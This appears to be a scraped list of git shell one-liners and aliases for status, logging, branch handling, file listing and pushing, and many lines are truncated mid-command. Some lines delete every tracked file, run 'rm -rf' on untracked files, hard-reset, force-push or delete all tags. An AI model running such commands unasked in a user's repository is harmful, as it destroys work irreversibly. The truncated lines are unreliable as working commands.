git status 2>/dev/null|grep branch;ls
git status . | less
git status . -unormal | grep modified
git status -vv | less -r
git status -uno | less
git status -uno | cowsay -n -f $(random_cow)
git status -uno -s | awk '{print \$2}'
git status -uall --porcelain | awk '{print \$2}'
git status -u --porcelain | awk '{ if (\$1 != \
git status -s|head
git status -sbuall | sort'
git status -sb 2>&1 | colorcat -P ~/s/konrad/cc/status.noon
git status -sb && (git stash list | cat)
git status -s | while read mode file; do echo $mode $file $(stat -c %y $file); done
git status -s | lolcat
git status -s | less
git status -s | grep \
git status -s | grep -v \?\?
git status -s | grep -v ?
git status -s | grep -n . --color=auto
git status -s | grep --color=always -v \
git status -s | grep 'M '
git status -s | grep 'D '
git status -s | grep 'A '
git status -s | egrep
git status -s | cat -n
git status -s | awk -F
git status -s | awk '{if (\$1 == \
git status -s | awk
git status -s 2>/dev/null | wc -l
git status -s -b && echo && gr -1 | head -n 1
git status -s -b && echo && git log | head -n 1
git status -s && echo --- branch && git branch && echo --- stash && git stash list | cat
git status --short | xargs trash
git status --short | vim -
git status --short | qf -m -f 'git add {2}'
git status --short | fzf --multi --color=dark --cycle --border --ansi --preview-window=up:70% --preview=\
git status --short --untracked-files | awk '{ print \$2 }'
git status --short --branch | grep
git status --porcelain | xargs rubocop
git status --porcelain | sed s/^...//
git status --porcelain | sed -ne 's/^ M //p'
git status --porcelain | sed -e \
git status --porcelain | grep -v
git status --porcelain | grep
git status --porcelain | cut -c4-
git status --porcelain | cut -c 4-
git status --porcelain | awk '{print \$2}'
git status --porcelain | awk '{print $2}'
git status --porcelain | awk '\$1 == \
git status --porcelain | awk
git status --porcelain -uno | cut -c4-
git status --porcelain -uno . | cut -c 4-
git status --porcelain -u | cut -c4-
git status --porcelain --short --ignored | sed -n 's/^!! //p'
git status --ignored --porcelain | sed -ne '/^!! */s///p'
git status --ignore-submodules | less
git status && git log | head
git status && echo && git lg1 | head -n1
git stash show -p | git apply -R
git stash show -p | git apply --reverse
git stash show -p | git apply && git stash drop
git stash show -p stash@{0} | git apply -R
git stash show --patch | git apply --reverse
git stash list | vim - +'set nonu' +'set ls=1'
git stash list | peco
git stash list | head -n 5
git stash list | head
git stash list | cat
git stash list | awk -F: '{ print \
git stash list | awk -F:
git stash list | awk
git stash list --date=local | perl -pE 's/stash@\{(?<date>.*)\}: .*[Oo]n (?<branch>.*?): (?<desc>.*)$/\
git stash && git checkout master && git branch --merged | grep -v \
git st | vi -
git st | less
git st | fpp
git st | awk '/modified:/ { print \$2 }'
git st | awk '/deleted:/ { print \$2 }'
git st | awk '/added:/ { print \$2 }'
git st -s | sed 's/^...//g'
git st -s | grep
git st && git diff | cat
git show-branch | grep
git show-branch -a --date-order | less
git show-branch --more=10 | less
git show-branch --list | sed -E
git show | tig
git show | head -3 && git remote -v
git show | gitlogdate
git show | gitlogauth
git show master:.gitlabels | less -RS
git show commit_sha1 -- file_nme.ext | git apply -R
git show `gitc` --color | less
git show HEAD^:/path/to/file | diff --side-by-side /path/to/file -
git show --pretty='format:' --name-only HEAD | xargs $EDITOR
git show --oneline | awk NR==1
git show --oneline --no-patch | awk '{print \$1}'
git show --format=%cr | head -n 1
git show $(git lol -n 1 | awk '{print $2}')
git show $(git log --format=%h^ master..HEAD | tail -n 1) --format=%cr
git shortlog | grep -E '^[^ ]'
git shortlog | grep -E
git shortlog | grep '):'
git shortlog -sn | awk -F '\t' 'BEGIN {print \
git shortlog -s | sort -nr
git shortlog -s | sort
git shortlog --reverse | head -n 11
git semaphore -s | jq
git s |grep UU
git s | awk '/On branch/{print $4}'
git rev-parse HEAD;git rev-parse HEAD | pbcopy;
git rev-parse HEAD | xclip -selection clipboard
git rev-parse HEAD | xclip -selection c
git rev-parse HEAD | xclip -select c && xclip -selection c -o
git rev-parse HEAD | xclip -sel clip
git rev-parse HEAD | xargs git show --name-only
git rev-parse HEAD | xargs git show
git rev-parse HEAD | tr -d '\\n'
git rev-parse HEAD | tee >(pbcopy)
git rev-parse HEAD | pbcopy; git show
git rev-parse HEAD | pbcopy ; pbpaste
git rev-parse HEAD | pbcopy && git rev-parse HEAD
git rev-parse HEAD | pbcopy
git rev-parse HEAD | head -c 7
git rev-parse HEAD | cut -c1-9
git rev-parse HEAD | cut -c1-8
git rev-parse HEAD | cut -c1-7
git rev-parse HEAD | cut -c1-6
git rev-parse HEAD | cut -c-7
git rev-parse HEAD | cut -c 1-11
git rev-parse HEAD | cut -c -8
git rev-parse HEAD | cut -c -7
git rev-parse HEAD | clip
git rev-parse HEAD | GREP_COLORS='ms=34;1' grep $(git rev-parse --short=0 HEAD)
git rev-parse HEAD && git rev-parse HEAD | pbcopy
git rev-parse --show-toplevel |xargs -I {} nvim {}/package.json
git rev-parse --show-toplevel |xargs -I {} jq
git rev-parse --show-toplevel | xargs open -a SourceTree
git rev-parse --show-toplevel | xargs gittower
git rev-parse --show-toplevel | xargs git add -A
git rev-parse --show-toplevel | xargs git add
git rev-parse --show-toplevel | xargs cd
git rev-parse --short origin/master | tcopy && git rev-parse --short origin/master
git rev-parse --short HEAD | xclip -selection clipboard; echo SHA of last commit copied to clipboard
git rev-parse --short HEAD | xclip -selection clipboard
git rev-parse --short HEAD | tr --delete '\n'
git rev-parse --short HEAD | pbcopy
git rev-parse --abbrev-ref HEAD | xclip -sel clip
git rev-parse --abbrev-ref HEAD | xargs git push origin --set-upstream
git rev-parse --abbrev-ref HEAD | xargs git push origin
git rev-parse --abbrev-ref HEAD | xargs git push -u origin
git rev-parse --abbrev-ref HEAD | xargs git push --set-upstream origin
git rev-parse --abbrev-ref HEAD | xargs git push --force origin
git rev-parse --abbrev-ref HEAD | xargs git push
git rev-parse --abbrev-ref HEAD | xargs git pull origin
git rev-parse --abbrev-ref HEAD | xargs git pull --rebase origin
git rev-parse --abbrev-ref HEAD | xargs git pull
git rev-parse --abbrev-ref HEAD | xargs git log --graph --abbrev-commit --decorate --date=relative --first-parent
git rev-parse --abbrev-ref HEAD | xargs -t -i {} git push origin {}:{}
git rev-parse --abbrev-ref HEAD | xargs -t -i {} git push all {}:{}
git rev-parse --abbrev-ref HEAD | xargs -t -I {} git push origin {}:{}
git rev-parse --abbrev-ref HEAD | xargs -t -I {} git push all {}:{}
git rev-parse --abbrev-ref HEAD | xargs -r git push origin
git rev-parse --abbrev-ref HEAD | xargs -n 1 git push origin
git rev-parse --abbrev-ref HEAD | tr -d '\n'
git rev-parse --abbrev-ref HEAD | tr -d '[[:space:]]'
git rev-parse --abbrev-ref HEAD | tr -d
git rev-parse --abbrev-ref HEAD | pbcopy && git checkout
git rev-parse --abbrev-ref HEAD | pbcopy
git rev-parse --abbrev-ref HEAD | grep -oh \
git rev-parse --abbrev-ref HEAD | grep -oE '[a-z]+\/'
git rev-parse --abbrev-ref HEAD | grep -oE '[A-Z]+-[0-9]+'
git rev-parse --abbrev-ref HEAD | git push origin $1
git rev-parse --abbrev-ref HEAD | git pull origin
git rev-parse --abbrev-ref HEAD | copy
git rev-parse --abbrev-ref HEAD | awk '{print \
git rev-parse --abbrev-ref HEAD | awk
git rev-parse --abbrev-ref @;git rev-parse --abbrev-ref @ | pbcopy;
git rev-list master.. | wc -l
git rev-list \`git branch | grep -e \
git rev-list HEAD | wc -l
git rev-list HEAD | tail -n 1
git rev-list HEAD -1 | pbcopy && pbpaste
git rev-list --reverse --ancestry-path HEAD..master | head -n 1
git rev-list --objects --all| git cat-file --batch-check=\
git rev-list --objects --all | grep \
git rev-list --objects --all | git cat-file --batch-check=
git rev-list --count HEAD ^master | bc
git rev-list --branches --all | wc -l
git rev-list --all | xargs git grep -n --break --heading
git rev-list --all | xargs git grep -F
git rev-list --all | xargs git grep --break
git rev-list --all | xargs git grep $1
git rev-list --all | xargs git grep
git rev-list --all | wc -l
git rev-list --all | tail
git rev-list --all --pretty=oneline | awk
git reset | amazeballs
git reset --soft \$(git log --format=%H -2 | tail -1)
git reset --soft $(git log --format=%H -2 | tail -1)
git reset --hard \$(git branch -ra | fzf)
git reset --hard HEAD~;git log -1|cat
git reset --hard HEAD | git clean -fd
git remote | xargs git remote show
git remote | xargs git remote prune
git remote | xargs -n1 git remote prune
git remote | xargs -n 1 git remote prune
git remote | xargs -n 1 git push
git remote | xargs -l git fetch -p
git remote | xargs -P10 -l git push --all
git remote | xargs -L1 git push -all
git remote | xargs -L1 git push --tags
git remote | xargs -L1 git push --all
git remote | xargs -L1 git push
git remote | xargs -L1 -t -IR git push R
git remote | xargs -L1 -t -IR git fetch R
git remote | xargs -L1 -i{} git push {}
git remote | xargs -L1 -I R git push -v R master
git remote | xargs -L 1 git push
git remote | xargs -L 1 -I@ git push
git remote | xargs -I{} git push {}
git remote | xargs -I % sh -c
git remote | peco
git remote | head -n 1
git remote update --prune; git branch -vv | awk
git remote show | xargs -I{} git remote prune {} && git gc
git remote show | column; git branch --all --list --column=dense --no-merged && git status && glog -n 3
git remote show origin | head
git remote show origin | grep patch
git remote show origin | grep feature
git remote show origin | grep Fetch
git remote show `git remote` | less
git remote set-url origin $(git remote get-url origin | sed 's/https:../git@/; s/.com\//.com:/')
git remote set-url origin $(git config --get remote.origin.url | sed -e 's/pensco.net/pensco.io/g')
git remote prune origin;git branch --merged master | grep -v \
git remote prune origin; git branch -r | grep coltin
git remote prune origin; git branch --merged | xargs git branch -d
git remote prune origin --dry-run; git remote prune upstream --dry-run; git branch --merged master | grep -v 'master$'
git remote prune origin && git gc --prune=now && git gc --aggressive && git tag -l | xargs git tag -d && git fetch --tags
git remote prune origin && git fetch -p && git branch -vv | awk
git remote prune origin && git branch -vv | grep -v origin
git remote prune origin && git branch -vv | grep
git remote prune origin && git branch -r | wc -l
git remote prune origin && git branch --merged | grep -v \
git remote get-url origin | xargs open
git remote get-url origin | xargs -i basename '{}' '.git'
git remote get-url origin | pbcopy
git remote get-url origin | awk -F[:.] '{print \
git remote -v|grep origin
git remote -v | xargs ruby -e \
git remote -v | ruby -e 'slug = STDIN.read.split(\
git remote -v | perl -0ne
git remote -v | head -20
git remote -v | grep push
git remote -v | grep origin && echo && git
git remote -v | column -t
git remote -v | awk '{ print \$1 \
git remote -v show -n origin | grep URL
git remote -v && git branch -a | head -n 10
git releasenotes | pbcopy; git push -u $(gremote) $(git rev-parse --abbrev-ref HEAD) && open $(ghurl)/compare/production...$(git rev-parse --abbrev-ref HEAD)?expand=1
git reflog | python ~/learning/gitstack/gitstack.py
git reflog | head -10
git reflog | head - 20
git reflog | head
git reflog | grep -o \
git reflog | fzf --preview=\
git reflog | egrep -io \
git reflog -1 | sed `s/^.*: //`
git reflog --stat --date=iso --pretty=format:'%C(yellow)%h %C(green)[%ad | %>(14)%ar] %C(blue)%gs %C(cyan)%ae %C(reset)%s%C(white)%d'
git reflog --pretty=raw | tig --pretty=raw
git reflog --patch --date=iso --pretty=format:'%C(yellow)%h %C(green)[%ad | %>(14)%ar] %C(blue)%gs %C(cyan)%ae %C(reset)%s%C(white)%d'
git reflog --graph --date=iso --pretty=format:'%C(yellow)%h %C(green)[%ad | %>(14)%ar] %C(blue)%gs %C(cyan)%ae %C(reset)%s%C(white)%d'
git reflog --format='%C(auto)%h %<|(20)%gd %C(blue)%cr%C(reset) %gs (%s)'
git reflog --format='%C(auto)%h %<|(18)%gd%C(blue)%ci%C(reset) %C(green)%cr%C(reset) %gs (%s)'
git reflog --format='%C(auto)%h %<|(17)%gd %C(blue)%ci%C(reset) %s'
git reflog --format='%C(auto)%h %<|(17)%gd %C(blue)%ci%C(reset) %gs'
git reflog --date=iso --pretty=format:'%C(yellow)%h %C(green)[%ad | %>(14)%ar] %C(blue)%gs %C(cyan)%ae %C(reset)%s%C(white)%d'
git recursive branch-status | less -S -R
git recursive --label=lines remote-status | column -t
git rebase -i $(git rev-list --all --merges | head -1)
git rebase $(git branch | fzf)
git rebase $(git --no-pager branch | fzf +m)
git r1 -n 1; git branch | grep \*; git status --short
git push | h -ni github.com Username Password Everything
git push origin `git rev-parse --abbrev-ref HEAD | sed
git push origin `git branch | sed -n '/\* /s///p'`
git push origin `git branch | grep -e
git push origin \`git status | grep \
git push origin \$(git branch | sed -n -e 's/^\* \(.*\)/\1/p')
git push origin \$(git branch | grep -E \
git push origin \$(git branch --contains | awk '{print \$2}')
git push origin HEAD --porcelain | git-post-push-compare-url
git push origin HEAD && git symbolic-ref --short HEAD | xargs hub compare
git push origin :\$(git symbolic-ref HEAD|cut -d
git push origin :$(git symbolic-ref HEAD 2> /dev/null | cut -b 12-)
git push origin $(gtc | first)
git push origin $(git symbolic-ref HEAD 2> /dev/null | cut -d
git push origin $(git status --porcelain -b 2> /dev/null | awk '{ print $2 }')
git push origin $(git branch | fzf)
git push origin $(git branch | awk
git push `git branch | fzf`
git push -v origin master && git rev-parse HEAD && git rev-parse HEAD | clipboard
git push -u origin master | lolcat
git push -u origin \$(git symbolic-ref --short -q HEAD | tr -d '\n') && mr $*
git push -u origin $(parse_git_branch | sed 's/(\(.*\))/\1/g')
git push -u origin $(git symbolic-ref HEAD | cut -d/ -f3-)
git push -u 2>&1 | track-prs-bb
git push -u --force-with-lease 2>&1 | track-prs-bb
git push -f origin $(git symbolic-ref HEAD 2> /dev/null | cut -b 12-)
git push --set-upstream origin \$(git branch | awk '/^\\* / { print \$2 }')
git push --set-upstream origin \$(git branch | awk '/^\* / { print \$2 }')
git push --set-upstream origin $(git branch | awk '/^\* / { print $2 }')
git push --force-with-lease && cowsay -r 'Force push (with lease)' | lolcatjs
git push --force && echo y | git buildkite
git push --follow-tags --set-upstream origin \$(git branch | awk '/^\* / { print \$2 }')
git push && echo $(git-current-branch) $(git-short-sha) && git-short-sha | tcopy
git push $gitremote \$(git branch | awk '/*/ {print \$2}')
git pull; hub pull-request | pbcopy
git pull; git branch --merged master | egrep -v \
git pull | lolcat
git pull origin --rebase; git branch --merged | grep -v \
git pull origin $(git branch | grep
git pull origin $(git branch | awk
git pull `git branch | fzf`
git pull --rebase origin $(git symbolic-ref HEAD 2> /dev/null | cut -d
git pull --rebase origin $(git symbolic-ref HEAD 2> /dev/null | cut -b 12-)
git pull --rebase && git log --color --pretty=oneline --abbrev-commit HEAD@{1}.. | sed 's/^/ /'
git pull --ff origin $(git branch | grep
git pull && git add . && curl -s -X GET http://whatthecommit.com/index.txt | git commit --file - && git push
git pull && echo code pull done|espeak
git pull $gitremote \$(git branch | awk '/*/ {print \$2}')
git prebase HEAD~$(hr | wc -l)
git plog | head -20
git plog | head
git num | wc -l
git name-rev --name-only HEAD | xargs git push --set-upstream origin $1
git name-rev --name-only HEAD | pbcopy
git mine | head -10
git mf | vi -
git merge-base-diff HEAD | less -R -S
git merge-base master HEAD | xargs -I @ git log --reverse --pretty=format:'%s' @..HEAD
git merge-base `git rev-parse --abbrev-ref HEAD` master | xargs git rebase -i
git merge `git branch --sort=-committerdate| head -n 1`
git merge --no-ff $(git branch | fzf --height 40%)
git merge --no-ff $(git --no-pager branch | fzf +m -1 -0)
git merge $(git branch | fzf)
git merge $(git branch | fzf --height 50% --border --ansi --tac)
git merge $(git --no-pager branch | fzf +m -1 -0)
git l|head -20
git lsf|cut -c 51-
git ls3 | head
git ls-tree -r HEAD | grep -i
git ls-tree --name-only HEAD | xargs $aliases[ls] -d
git ls-tree --full-name --name-only HEAD | while read filename; do echo $(git log -1 --format=%ar -- ${filename##*/})\\t$filename; done
git ls-tree --full-name --full-tree --name-only -r HEAD | grep -i
git ls-remote | perl -ne '/\/([^\/]+\$)/; print \$1'
git ls-remote | grep -i
git ls-remote \$($REMOTE_ORIGIN_URL) | grep refs/tags/\$($NEAREST_TAG)
git ls-remote \$($REMOTE_ORIGIN_URL) | grep refs/heads/\$($BRANCH_NAME)
git ls-remote \$($REMOTE_ORIGIN_URL) | grep refs/heads/
git ls-files|more
git ls-files|grep
git ls-files|ag -i
git ls-files| grep -Ei
git ls-files | xargs wc -l
git ls-files | xargs wc
git ls-files | xargs perl -pi -e 's/ +$//'
git ls-files | xargs ls -d1 --color
git ls-files | xargs ls
git ls-files | xargs codespell
git ls-files | xargs cloc
git ls-files | while read f; do git blame -w -M -C -C --line-porcelain
git ls-files | wc -l
git ls-files | wc
git ls-files | pvim
git ls-files | peco
git ls-files | p open
git ls-files | less -FRXm
git ls-files | grep -i
git ls-files | grep -E -i
git ls-files | grep $1
git ls-files | grep
git ls-files | fzf
git ls-files | fgrep
git ls-files | f open
git ls-files | ep
git ls-files | entr $@
git ls-files | egrep
git ls-files | ctags -e -L -
git ls-files | ctags -L - --sort=foldcase --c++-kinds=+p --fields=+iaS --extra=+q --language-force=C++
git ls-files | ctags -L - --sort=foldcase
git ls-files | ctags -L -
git ls-files | ctags --extra=+q -e -R --links=no -L-
git ls-files | ag
git ls-files | ack -i
git ls-files | ack --smart-case --no-column --noenv
git ls-files | ack
git ls-files | /usr/local/opt/universal-ctags/bin/ctags --extras=+f -L-
git ls-files | /bin/grep -wi
git ls-files | /bin/grep -w
git ls-files -z | xargs -0 rm
git ls-files -z | xargs -0 grep -P
git ls-files -z | xargs -0 git update-index --assume-unchanged
git ls-files -z | xargs -0 dos2unix
git ls-files -z | xargs -0 cscope -qb
git ls-files -z | while IFS= read -rd '' f; do tail -c1 <
git ls-files -z -o --exclude-standard | xargs -0 git add
git ls-files -z -d --exclude-standard | xargs -0 git rm
git ls-files -z --deleted | xargs -I{} --null git rm {}
git ls-files -z --deleted | xargs -0 git rm
git ls-files -z --deleted | git update-index -z --remove --stdin
git ls-files -v|grep '^h'
git ls-files -v|grep '^[[:lower:]]'
git ls-files -v|grep '^S'
git ls-files -v | grep ^h
git ls-files -v | grep ^[a-z]
git ls-files -v | grep ^S
git ls-files -v | grep \
git ls-files -v | grep -e '^[hsmrck]'
git ls-files -v | grep -e '^[^H]'
git ls-files -v | grep '^[a-z]'
git ls-files -v | grep '^[^H]'
git ls-files -v | grep '^[[:lower:]]'
git ls-files -v | grep
git ls-files -v | egrep ^S
git ls-files -v . | grep ^S
git ls-files -t \$(find . -type f -size +1M -print0 | xargs -0)
git ls-files -oc --exclude-standard | ack -x
git ls-files -o | sed -r \
git ls-files -o | grep swp
git ls-files -o -m --exclude-standard | xargs nvim
git ls-files -o -m --exclude-standard | xargs mvim
git ls-files -o -i --exclude-standard --directory | grep -v '\.DS_Store'
git ls-files -o --exclude-standard | xargs rm
git ls-files -o --exclude-standard | xargs git ignore
git ls-files -o --exclude-standard | xargs git add
git ls-files -o --exclude-standard -z | xargs -0 git-add && git status
git ls-files -o --exclude-per-directory=.gitignore | xargs git add
git ls-files -m |xargs pyflakes
git ls-files -m | xargs touch'
git ls-files -m | xargs ls -ltr
git ls-files -m | xargs git checkout --
git ls-files -m | xargs git add
git ls-files -m | xargs -o vim
git ls-files -m -o --exclude-standard | fzf
git ls-files -m -d | head -n 1
git ls-files -m --others --exclude-standard .loki | xargs open
git ls-files -i --exclude-from=.gitignore | xargs git rm --cached
git ls-files -d|xargs git rm
git ls-files -dz | xargs -0 git rm
git ls-files -deleted | xargs git rm
git ls-files -d |xargs git checkout --
git ls-files -d | xargs git rm; gst
git ls-files -d | xargs git rm
git ls-files -d | xargs git checkout --
git ls-files -d | xargs git checkout
git ls-files -d | xargs -i git checkout {}
git ls-files -d -z | xargs -0 git update-index --remove
git ls-files -d -m -o -z --exclude-standard | xargs -0 git update-index --add --remove
git ls-files -co --exclude-standard | grep
git ls-files -co --exclude-standard -z | xargs -0 grep --color=auto -nT
git ls-files -cmo | grep -i
git ls-files -ci --exclude-standard -z | xargs -0 git rm --cached
git ls-files --stage | grep 160000
git ls-files --recurse-submodules -z | xargs -0 grep --color=auto --line-number --exclude=
git ls-files --others --exclude-standard |xargs -n 1 -I {} git diff /dev/null {}
git ls-files --others --exclude-standard | xargs rm
git ls-files --others --exclude-standard | xargs git add -N
git ls-files --others --exclude-standard | xargs git add
git ls-files --others --exclude-standard -z | xargs -0 tar czvf ~/backup-untracked.tar
git ls-files --others --exclude-from=.git/info/exclude | grep -v -e '^vendor/' -e '^libraries/bi' -e '^build/' -e '^data/'
git ls-files --others --cached --exclude-standard | ack -x
git ls-files --other --exclude-standard | xargs rm
git ls-files --other --exclude-standard | xargs git add
git ls-files --other --exclude-standard -z | xargs -0 git add -Nv
git ls-files --modified| xargs git add
git ls-files --modified | xargs git add; git status
git ls-files --modified | xargs git add -u
git ls-files --modified | xargs git add
git ls-files --modified | xargs
git ls-files --modified | uniq
git ls-files --modified | fgrep
git ls-files --modified --others --exclude-standard | xargs zip
git ls-files --modified --others --exclude-standard | vimo
git ls-files --ignored --exclude-standard | xargs git rm --cached
git ls-files --ignored --exclude-standard | xargs git rm
git ls-files --ignored --exclude-standard | xargs -0 git rm -r
git ls-files --full-name -i --exclude-from=.gitignore | xargs git rm --cached
git ls-files --exclude-standard --others --cached | fzf
git ls-files --directory --exclude-standard --others | xargs rm -rf
git ls-files --deleted|xargs git rm
git ls-files --deleted| xargs git rm
git ls-files --deleted | xargs git rm
git ls-files --deleted | xargs git checkout
git ls-files --deleted | xargs git add
git ls-files --deleted -z | xargs -0 git rm
git ls-files --deleted -z | git update-index --assume-unchanged -z --stdin
git ls-files '*.rb' | xargs sed '1i\# -*- encoding: utf-8 -*-' -i
git ls | grep
git ls | HEAD
git ls -m|xargs git co HEAD
git lola | head -30
git logg | head
git logg > /tmp/tmp999 && cat /tmp/tmp999|head -n 10
git log-all | less -R
git log |grep
git log | vim -R -
git log | vim -
git log | tig
git log | subl
git log | nvim -MR -
git log | nvim
git log | more
git log | mate
git log | less -N
git log | less
git log | head -n 40
git log | head -20
git log | head -1 && git status
git log | head -1
git log | head
git log | grep -c commit
git log | grep
git log | git humin
git log | bat
git log origin/master..HEAD --oneline | cat
git log origin/master.. --stat | clipit
git log origin/master.. -- | wc -l
git log master..dev --format=%s | grep -v -i ^Merge
git log master..HEAD --date=relative --pretty=format:'- %s ([*view commit*](https://outlookweb.visualstudio.com/Outlook%20Web/_git/client-web/commit/%H))' --reverse | clip
git log master..$(git rev-parse --abbrev-ref HEAD) --pretty=oneline | wc -l
git log master..$(gcurrent) --oneline | tail -1
git log `git describe --tags --abbrev=0`..HEAD --oneline --pretty=%s --reverse | pbcopy
git log `curl https://dleheracles.mheducation.com/git_info.txt | _parseGitInfo`..
git log \$(git rev-parse --symbolic --branches | tr '\n' ' ') --graph --date=relative --topo-order --pretty=format:'%C(cyan)[%an]%Creset %C(green bold)%d%Creset %C(yellow)%h%Creset : %s %C(cyan)[%ad]%Creset' --
git log HEAD~10..HEAD --pretty=oneline | tail -n 10
git log . | grep Fuang
git log -p | vim -
git log -p | tig
git log -p | grep
git log -p | cat
git log -p -40 | vim - -R -c 'set foldmethod=syntax' -O1
git log -p -40 | vim - -R -c 'set foldmethod=syntax'
git log -p -2 | ydiff -s -w 0
git log -p --reverse master.. | less -R -S
git log -p --decorate | less -R -S
git log -p --decorate --color | less -R
git log -p --color --since='4 days ago' | less -R
git log -p $(find-code | peco)
git log -oneline | wc -l
git log -n 1 —pretty=format:'%h' | pbcopy
git log -n 1 | grep -q -c wip; and git reset HEAD~1
git log -n 1 | grep -q -c wip && git reset HEAD~1
git log -n 1 | grep -q -c \
git log -n 1 | grep -q -c
git log -n 1 --pretty=format:%B | pbcopy
git log -5 | sed -ne '/^commit/s/commit \(......\).*/\1/p'
git log -3 --graph --pretty=tformat:'%C(bold blue)<%an> %Cgreen(%cr)%Creset - %Cred%h%Creset -%C(yellow)%d%n%Creset %s' --abbrev-commit --date=relative | cat
git log -1|tail -1
git log -10 | tee
git log -1 | cat
git log -1 --pretty=oneline --abbrev-commit|cut -c1-7
git log -1 --pretty=format:%H | xsel -b
git log -1 --pretty=format:%H | pbcopy
git log -1 --pretty=format:%B | xsel -b
git log -1 --pretty=%H | pbcopy
git log -1 --pretty=%B | pbcopy
git log -1 --pretty=%B | clip
git log -1 --pretty | pbcopy
git log -1 --format=%cd.%h --date=short|tr -d -
git log --word-diff-regex='[[:alnum:]]+|[^[:space:]]' --color-words -p -w --reverse -M origin/integration..
git log --stat|sed -e 's/\(<[^@>]*\)@\([^>]*>\)/\1 (at) \2/'
git log --stat | vim -R -
git log --stat | bat
git log --stat --graph --oneline | head -n 20
git log --stat --date=iso --pretty=format:'%C(yellow)%h %C(green)[%ad | %>(14)%ar] %C(cyan)%ae %C(reset)%s%C(white)%d' @{upstream}..
git log --stat --date=iso --pretty=format:'%C(yellow)%h %C(green)[%ad | %>(14)%ar] %C(cyan)%ae %C(reset)%s%C(white)%d' ..@{upstream}
git log --since=01.`date +%m.%Y` --author=mucko -p -w |& tee mucko.`date +%m.%Y`.patch
git log --since '2016-10-15' --format='%aE' | sort -u
git log --reverse | cat && echo
git log --reverse --pretty=format:'%C(yellow)%h%Creset %C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)<%an>%Creset' --abbrev-commit --date=short|grep
git log --pretty=oneline|tig
git log --pretty=oneline|head -10
git log --pretty=oneline | wc -l
git log --pretty=oneline | sed -r 's/([0-9a-f]{7})[0-9a-f]*/\1/'
git log --pretty=oneline | head -n 25
git log --pretty=oneline | head -n 10
git log --pretty=oneline | head -20
git log --pretty=oneline | head
git log --pretty=oneline | fzf
git log --pretty=oneline | cat
git log --pretty=oneline HEAD^..HEAD | cut -c 1-7
git log --pretty=oneline --reverse | head -1
git log --pretty=oneline --graph --decorate --color | emojify
git log --pretty=oneline --abbrev-commit origin/production..origin/master | grep -vi 'merge'
git log --pretty=format:“%h %ad | %s%d [%an]” --graph --date=short
git log --pretty=format:'• %C(bold yellow)%h%C(reset) %C(red)%an%C(reset) %C(blue)%ai%C(reset) %C(bold red)%D%C(reset) | %s'
git log --pretty=format:'x' | wc -l
git log --pretty=format:'' | wc -l
git log --pretty=format:'%s' -i --grep='merge' -n 1 | awk '{print \$NF}'
git log --pretty=format:'%h' | wc -l
git log --pretty=format:'%h' -n 1 | xclip -sel clip
git log --pretty=format:'%h' -n 1 | pbcopy
git log --pretty=format:'%h' -n 1 | cat
git log --pretty=format:'%h %s (%an)' --date=short -n1 | pclip
git log --pretty=format:'%h %ad | [%an] %s%d' --graph --date=short
git log --pretty=format:'%h %ad | %s%d [%an]' --graph --date=short head -25
git log --pretty=format:'%h %ad | %s%d [%an]' --graph --date=short --max-count=10
git log --pretty=format:'%h %ad | %s%d [%an]' --graph --date=short --author=jg@stripe.com
git log --pretty=format:'%h %ad | %s%d [%an]' --graph --date=short
git log --pretty=format:'%h %ad | %s%d [%an]' --date=short --abbrev-commit
git log --pretty=format:'%h %ad | %s%d ' --graph --date=short --since='31 days ago'
git log --pretty=format:'%h %ad | %s [%an]' --author=Giacomo --date=format:\
git log --pretty=format:'%ad | %s'
git log --pretty=format:'%ad | %s%d [%an]' --graph --date=short
git log --pretty=format:'%ad [%an] | %s' --date=format:'%d/%m/%y %H:%M'
git log --pretty=format:'%ad %s' --author='Dewald de Jager' | less
git log --pretty=format:'%H %ad | %s%d [%an]' --graph --date=short
git log --pretty=format:'%Cgreen%h%Creset %ad | %s%Cred%d %Cblue[%an]%Creset ' --graph --date=short
git log --pretty=format:'%Cblue%h%Creset %Cgreen%ad%Creset | %s%C(yellow)%d%Creset [%an]' --graph --date=short --decorate
git log --pretty=format:'%C(yellow)%h%Creset | %s%d [%C(red)%an%Creset@%ad]' --date=short
git log --pretty=format:'%C(yellow)%h%Creset %ad %C(yellow)|%Creset %s%C(bold blue)%d%Creset %C(red)[%an]%Creset' --graph --date=short
git log --pretty=format:'%C(yellow)%h %Cred%ad %Cblue%an%Cgreen%d %Creset%s' --date=short | less -R
git log --pretty=format:'%C(red)%h%C(reset) -%C(auto)%d%C(reset) %C(yellow)%an%C(reset) › %C(white)%s%C(reset) %C(yellow)%cr »%C(reset) %C(dim yellow)%ci%C(reset)' --reverse | grep -i
git log --pretty=format:'%C(dim white)%h %ad%Creset %C(normal)%s%Creset | %C(yellow)%an%Creset' --stat
git log --pretty=format:'%C(bold blue)%ad %Cred%an%Cgreen%d %C(yellow)%s %Creset' --abbrev-commit | head -n 30
git log --pretty=format:%s \`git describe --abbrev=0 --match 'v[0-9]*.[0-9]*.[0-9]*'\`..HEAD | grep 'Merge pull request'
git log --pretty=format:%h -n 1 | pbcopy
git log --pretty=format:%an > | awk '{ ++c[$0]; } END { for(cc in c) printf
git log --pretty=format:%H -1 | pbcopy
git log --pretty=format:%H -1 | _copy_and_print
git log --pretty=format: --name-only --diff-filter=A | sort -u
git log --pretty=format: --name-only --diff-filter=A | sort
git log --pretty=format: '%h %ad | %s%d [%an]' --graph --date=short
git log --pretty='%H' $1 | xargs -n1 git describe --tags --exact-match 2>/dev/null
git log --pretty='%Cred%h%Creset | %C(yellow)%d%Creset %s %Cgreen(%cr)%Creset %C(cyan)[%an]%Creset' --graph
git log --pretty='%Cred%h%Creset | %C(yellow)%d%Creset %s %Cgreen(%cr) %C(cyan)[%an] ' --graph
git log --pretty=%H | head -n +1
git log --pretty=%B -1 |head -n1
git log --patch --date=iso --pretty=format:'%C(yellow)%h %C(green)[%ad | %>(14)%ar] %C(cyan)%ae %C(reset)%s%C(white)%d' @{upstream}..
git log --patch --date=iso --pretty=format:'%C(yellow)%h %C(green)[%ad | %>(14)%ar] %C(cyan)%ae %C(reset)%s%C(white)%d' ..@{upstream}
git log --oneline | wc -l
git log --oneline | nvim
git log --oneline | less -R -S
git log --oneline | head -n 5
git log --oneline | head -n 40
git log --oneline | head -n 15
git log --oneline | head -n 10
git log --oneline | head -n
git log --oneline | head -5
git log --oneline | head -10
git log --oneline | head
git log --oneline | grep
git log --oneline | fzf --multi --reverse --preview 'git show {+1}'
git log --oneline | fzf --multi --preview 'git show {+1}'
git log --oneline | fzf
git log --oneline \$(git tag|tail -n1)..HEAD
